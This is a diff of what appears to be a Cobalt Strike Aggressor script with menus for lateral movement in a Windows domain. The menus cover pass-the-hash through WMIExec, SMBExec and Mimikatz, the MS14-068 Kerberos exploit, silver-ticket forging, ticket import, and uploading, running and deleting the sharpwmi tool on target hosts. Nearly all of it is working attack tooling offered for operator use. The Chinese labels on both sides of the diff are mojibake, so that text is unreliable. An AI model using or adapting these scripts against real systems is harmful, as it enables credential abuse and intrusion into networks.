@@ -1,16 +1,16 @@
-# ºáÏòÒÆ¶¯²âÊÔ
+# æ¨ªå‘ç§»åŠ¨æµ‹è¯•
 
 
-menu "ºáÏòÒÆ¶¯" {
+menu "æ¨ªå‘ç§»åŠ¨" {
 	menu "Pass The Hash" {
 		item "Invoke-WMIxec" {
 			$dialog = dialog("WMIexec" , %(bid => $1["@"] , IP => "192.168.111.130" , Domain => "Mikasa.com" , command => "whoami" , user => "administrator" , hash => "xxx" )  ,&Wmiexec);
-			dialog_description($dialog,"Ê¹ÓÃWMIexexÀ´½øĞĞ¹şÏ£´«µİ");
-			drow_text($dialog, "IP" ,"µ¥¸öIP:");
-			drow_text($dialog, "Domain" ,"ÓòÃû:");
+			dialog_description($dialog,"ä½¿ç”¨WMIexexæ¥è¿›è¡Œå“ˆå¸Œä¼ é€’");
+			drow_text($dialog, "IP" ,"å•ä¸ªIP:");
+			drow_text($dialog, "Domain" ,"åŸŸå:");
 			drow_text($dialog, "user" , "user:");
 			drow_text($dialog, "hash" ,"hash");
-			drow_text($dialog, "command" ,"Ö´ĞĞÃüÁî:");
+			drow_text($dialog, "command" ,"æ‰§è¡Œå‘½ä»¤:");
 			dbutton_action($dialog,"Exploit");
 			dialog_show($dialog);
 
@@ -19,12 +19,12 @@ menu "ºáÏòÒÆ¶¯" {
 		separator();
 		item "Invoke-SMBExec" {
 			$dialog = dialog("WMIexec" , %(bid => $1["@"] , IP => "192.168.1.1" , Domain => "Mikasa.com" , command => "whoami" , user => "administrator" , hash => "xxx" )  ,&SMBexec);
-			dialog_description($dialog,"Í¨¹ıÔÚÄ¿±ê»úÆ÷ÉÏ´´½¨·şÎñÀ´Ö´ĞĞÃüÁî,È¨ÏŞÎªSYSTEM");
-			drow_text($dialog, "IP" ,"µ¥¸öIP:");
-			drow_text($dialog, "Domain" ,"ÓòÃû:");
+			dialog_description($dialog,"é€šè¿‡åœ¨ç›®æ ‡æœºå™¨ä¸Šåˆ›å»ºæœåŠ¡æ¥æ‰§è¡Œå‘½ä»¤,æƒé™ä¸ºSYSTEM");
+			drow_text($dialog, "IP" ,"å•ä¸ªIP:");
+			drow_text($dialog, "Domain" ,"åŸŸå:");
 			drow_text($dialog, "user" , "user:");
 			drow_text($dialog, "hash" ,"hash");
-			drow_text($dialog, "command" ,"Ö´ĞĞÃüÁî:");
+			drow_text($dialog, "command" ,"æ‰§è¡Œå‘½ä»¤:");
 			dbutton_action($dialog,"Exploit");
 			dialog_show($dialog);
 
@@ -32,10 +32,10 @@ menu "ºáÏòÒÆ¶¯" {
 		separator();
 		item "Invoke-Hash" {
 			$dialog = dialog("Hash" , %(bid => $1["@"] , IP => "192.168.111.0/24" , user => "administrator" , hash => "xxx" , type => "WMIExec" ) ,&InvokeHash);
-			dialog_description($dialog,"Í¨¹ıWMIExec»òÕßSMBExecÀ´½øĞĞHash´«µİ");
-			drow_text($dialog,"IP","IP·¶Î§");
-			drow_combobox($dialog,"type","ÀàĞÍ",@("WMIexec","SMBExec"));
-			drow_text($dialog,"user","ÓÃ»§Ãû");
+			dialog_description($dialog,"é€šè¿‡WMIExecæˆ–è€…SMBExecæ¥è¿›è¡ŒHashä¼ é€’");
+			drow_text($dialog,"IP","IPèŒƒå›´");
+			drow_combobox($dialog,"type","ç±»å‹",@("WMIexec","SMBExec"));
+			drow_text($dialog,"user","ç”¨æˆ·å");
 			drow_text($dialog,"hash","hash");
 			dbutton_action($dialog,"Exploit!");
 			dialog_show($dialog);
@@ -43,9 +43,9 @@ menu "ºáÏòÒÆ¶¯" {
 		separator();
 		item "Mimikatz-Pth" {
 			$dialog = dialog("Mimikatz-pth" , %(bid => $1["@"] , Domain => "Mikasa.com" , user => "administrator" , hash => "xxx" ) ,lambda({ bpassthehash($3["bid"],$3["Domain"],$3["user"],$3["hash"]); }));
-			dialog_description($dialog,"Ê¹ÓÃmimikatz½øĞĞhash´«µİ,ÒòÎªMimikatzµÄ¹¤×÷»úÖÆ±ØĞëÒªÓĞ±¾µØµÄ¹ÜÀíÔ±È¨ÏŞ");
-			drow_text($dialog,"Domain","ÓòÃû:");
-			drow_text($dialog,"user","ÓÃ»§:");
+			dialog_description($dialog,"ä½¿ç”¨mimikatzè¿›è¡Œhashä¼ é€’,å› ä¸ºMimikatzçš„å·¥ä½œæœºåˆ¶å¿…é¡»è¦æœ‰æœ¬åœ°çš„ç®¡ç†å‘˜æƒé™");
+			drow_text($dialog,"Domain","åŸŸå:");
+			drow_text($dialog,"user","ç”¨æˆ·:");
 			drow_text($dialog,"hash","Hash:");
 			dbutton_action($dialog,"Exploit");
 			dialog_show($dialog);
@@ -53,9 +53,9 @@ menu "ºáÏòÒÆ¶¯" {
 		separator();
 		item "pth_injection_with_Ticket" {
 			$dialog = dialog("pth_Ticket", %(bid => $1["@"] , Domain => "Mikasa.com" , user => "administrator" , Hash => "xxxx") ,&pth_injection_Ticket);
-			dialog_description($dialog,"ÒòÎªÊ¹ÓÃMimikatz´«µİhashĞèÒª¹ÜÀíÔ±È¨ÏŞ,ËùÒÔ¿ÉÒÔ²ÉÓÃÆ±¾İµÄĞÎÊ½");
-			drow_text($dialog,"Domain","ÓòÃû:")
-			drow_text($dialog,"user","ÓÃ»§:");
+			dialog_description($dialog,"å› ä¸ºä½¿ç”¨Mimikatzä¼ é€’hashéœ€è¦ç®¡ç†å‘˜æƒé™,æ‰€ä»¥å¯ä»¥é‡‡ç”¨ç¥¨æ®çš„å½¢å¼");
+			drow_text($dialog,"Domain","åŸŸå:")
+			drow_text($dialog,"user","ç”¨æˆ·:");
 			drow_text($dialog,"Hash","Hash:");
 			dbutton_action($dialog,"Exploit");
 			dialog_show($dialog);
@@ -80,11 +80,11 @@ sub internal_monologue{
 }		
 
  menu "sharpwmi" {
-			item "ÉÏ´«sharpwmi" {
+			item "ä¸Šä¼ sharpwmi" {
 				$bid = $1;
-				$dialog = dialog("ÉÏ´«sharpwmi", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sharpwmi_up);
-				drow_text($dialog, "UploadPath",  "ÉÏ´«Â·¾¶: "); 	
-				dbutton_action($dialog, "ÉÏ´«");
+				$dialog = dialog("ä¸Šä¼ sharpwmi", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sharpwmi_up);
+				drow_text($dialog, "UploadPath",  "ä¸Šä¼ è·¯å¾„: "); 	
+				dbutton_action($dialog, "ä¸Šä¼ ");
 				dialog_show($dialog);
         }
 sub sharpwmi_up {
@@ -93,16 +93,16 @@ sub sharpwmi_up {
     
 
 }
-                item "ÔËĞĞsharpwmi"{
+                item "è¿è¡Œsharpwmi"{
                     $bid = $1['@'];
-                    $Dialog = dialog("ÔËĞĞsharpwmi",%(ip => "127.0.0.1", username => "administrator", password => "password", type => "cmd or upload", cmd/path => "cmd or upload path",bid => $bid),&sharpwmi_run);
-                    dialog_description($Dialog, "ÕâÊÇÒ»¸ö»ùÓÚ135¶Ë¿ÚÀ´½øĞĞºáÏòÒÆ¶¯µÄ¹¤¾ß£¬¾ßÓĞÖ´ĞĞÃüÁîºÍÉÏ´«ÎÄ¼ş¹¦ÄÜ£¬Í¨¹ıwmiÀ´Ö´ĞĞÃüÁî£¬Í¨¹ıµ÷ÓÃÀ´½øĞĞÊı¾İ´«Êä,Ä¿Ç°Ö»Ö§³ÖÉÏ´«512kbÒÔÏÂµÄÎÄ¼ş£¬ÒòÎªÖØÖÃÃ¿¸öÖµµÄ³¤¶È²»ÄÜ³¬¹ı512kb¡£");
+                    $Dialog = dialog("è¿è¡Œsharpwmi",%(ip => "127.0.0.1", username => "administrator", password => "password", type => "cmd or upload", cmd/path => "cmd or upload path",bid => $bid),&sharpwmi_run);
+                    dialog_description($Dialog, "è¿™æ˜¯ä¸€ä¸ªåŸºäº135ç«¯å£æ¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨çš„å·¥å…·ï¼Œå…·æœ‰æ‰§è¡Œå‘½ä»¤å’Œä¸Šä¼ æ–‡ä»¶åŠŸèƒ½ï¼Œé€šè¿‡wmiæ¥æ‰§è¡Œå‘½ä»¤ï¼Œé€šè¿‡è°ƒç”¨æ¥è¿›è¡Œæ•°æ®ä¼ è¾“,ç›®å‰åªæ”¯æŒä¸Šä¼ 512kbä»¥ä¸‹çš„æ–‡ä»¶ï¼Œå› ä¸ºé‡ç½®æ¯ä¸ªå€¼çš„é•¿åº¦ä¸èƒ½è¶…è¿‡512kbã€‚");
                     drow_text($Dialog, "ip", "ip: ");
 					drow_text($Dialog, "username", "username: ");
 					drow_text($Dialog, "password", "password: ");
 					drow_text($Dialog, "type", "cmd/upload: ");
 					drow_text($Dialog, "cmd/path", "cmd/path: ");
-                    dbutton_action($Dialog, "ÔËĞĞ");
+                    dbutton_action($Dialog, "è¿è¡Œ");
                     dialog_show($Dialog);
                 }
 
@@ -115,7 +115,7 @@ sub sharpwmi_run{
 	$cmd/path = $3['cmd/path'];
 	bshell($bid, "sharpwmi.exe  $+ $Name  $+ $port  $+ $username  $+ $password  $+ $type  $+ $cmd/path");
 } 
-        	item "É¾³ısharpwmi"{
+        	item "åˆ é™¤sharpwmi"{
         	local('$bid');
         	foreach $bid ($1){
             	bshell($1, "del /f /s /q sharpwmi.exe");
@@ -126,38 +126,38 @@ sub sharpwmi_run{
 	separator();
 	menu "Pass The Ticket" {
 		item "Ms14-068(KB3011780)" {
-			show_message("Ê¹ÓÃ´Ë·½·¨»áÇå³ı±¾µØÆ¾¾İ!!");
-			$dialog = dialog("Ms14-068", %(bid => $1["@"] , Domain => "Mikasa.com" , user => "administrator" , password => "123456" , user_sid => "ÓòÓÃ»§SID" , DC_name => "Óò¿Ø") , &Ms14_068);
-			dialog_descrption($dialog,"Î¢ÈíPAC¼ìÑé²»ÑÏ¸ñµ¼ÖÂµÄÂ©¶´");
-			drow_text($dialog,"Domain","ÓòÃû:");
-			drow_text($dialog,"user","ÓÃ»§:");
-			drow_text($dialog,"password","ÃÜÂë:");
-			drow_text($dialog,"user_sid","ÓÃ»§SID:");
-			drow_text($dialog,"DC_name","Óò¿ØÃû:");
+			show_message("ä½¿ç”¨æ­¤æ–¹æ³•ä¼šæ¸…é™¤æœ¬åœ°å‡­æ®!!");
+			$dialog = dialog("Ms14-068", %(bid => $1["@"] , Domain => "Mikasa.com" , user => "administrator" , password => "123456" , user_sid => "åŸŸç”¨æˆ·SID" , DC_name => "åŸŸæ§") , &Ms14_068);
+			dialog_descrption($dialog,"å¾®è½¯PACæ£€éªŒä¸ä¸¥æ ¼å¯¼è‡´çš„æ¼æ´");
+			drow_text($dialog,"Domain","åŸŸå:");
+			drow_text($dialog,"user","ç”¨æˆ·:");
+			drow_text($dialog,"password","å¯†ç :");
+			drow_text($dialog,"user_sid","ç”¨æˆ·SID:");
+			drow_text($dialog,"DC_name","åŸŸæ§å:");
 			dbutton_action($dialog,"Exploit");
 			dialog_show($dialog);	
 		}
 		separator();
 		item "Silver-ticket" {
 				$dialog = dialog("DomainInfo", %( bid => $1["@"] , Domain => "Mikasa.com" , Domain_sid => "xxx" , Target_name => "WIN-Q1E9PO4969I" , target_hash => "xxx" , user => "administrator" , server => "LDAP" ) ,&Silver_DCSync);
-				dialog_description($dialog,"ÀûÓÃ°×ÒøÆ±¾İÀ´»ñµÃ¶ÔÄ³Ò»·şÎñµÄ·ÃÎÊÈ¨ÏŞ");
-				drow_text($dialog,"Domain","ÓòÃû:");
-				drow_text($dialog,"Domain_sid","ÓòSID:");
-				drow_text($dialog,"Target_name","Ä¿±ê»úÆ÷Ãû:");
-				drow_text($dialog,"target_hash","Ä¿±ê»úÆ÷Hash:");
-				drow_text($dialog,"user","ÓÃ»§:");
-				drow_combobox($dialog,"server","·şÎñ:",@("LDAP","CIFS","HOST","RPCSS","HTTP"));
+				dialog_description($dialog,"åˆ©ç”¨ç™½é“¶ç¥¨æ®æ¥è·å¾—å¯¹æŸä¸€æœåŠ¡çš„è®¿é—®æƒé™");
+				drow_text($dialog,"Domain","åŸŸå:");
+				drow_text($dialog,"Domain_sid","åŸŸSID:");
+				drow_text($dialog,"Target_name","ç›®æ ‡æœºå™¨å:");
+				drow_text($dialog,"target_hash","ç›®æ ‡æœºå™¨Hash:");
+				drow_text($dialog,"user","ç”¨æˆ·:");
+				drow_combobox($dialog,"server","æœåŠ¡:",@("LDAP","CIFS","HOST","RPCSS","HTTP"));
 				dbutton_action($dialog,"Exploit");
 				dialog_show($dialog);
 
 		}
 		separator();
 		item "import_ticket" {
-			$dialog = dialog("µ¼ÈçÆ±¾İÎÄ¼ş	ÓÚ´Ë»á»°ÖĞ", %( bid => $1["@"] , file => "") ,lambda({
+			$dialog = dialog("å¯¼å¦‚ç¥¨æ®æ–‡ä»¶	äºæ­¤ä¼šè¯ä¸­", %( bid => $1["@"] , file => "") ,lambda({
 				bkerberos_ticket_use($3["bid"],$3["file"])
 			}));
-			dialog_description($dialog,"µ¼ÈëÆ±¾İÎÄ¼ş");
-			drow_file($dialog,"file","Æ±¾İÎÄ¼ş:");
+			dialog_description($dialog,"å¯¼å…¥ç¥¨æ®æ–‡ä»¶");
+			drow_file($dialog,"file","ç¥¨æ®æ–‡ä»¶:");
 			dbutton_action($dialog,"Exploit");
 			dialog_show($dialog);
 		}
